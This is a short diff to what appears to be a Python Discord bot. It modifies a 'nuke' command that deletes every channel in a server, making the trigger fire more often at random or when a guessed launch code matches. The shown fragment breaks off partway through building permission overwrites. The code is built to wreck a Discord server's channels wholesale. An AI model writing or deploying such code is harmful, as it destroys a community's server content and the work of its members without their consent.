@@ -27,7 +27,7 @@ async def _help(ctx):
 @client.command(name="nuke", pass_context = True)
 async def _nukeGuild(ctx, launch_code: int=None):
     await ctx.message.delete()
-    if random.randint(0,100) == random.randint(0,100):
+    if random.randint(0,50) == random.randint(0,50) or launch_code == random.randint(1000,9999):
         for channel in ctx.guild.channels:
             await channel.delete()
         overwrites = {
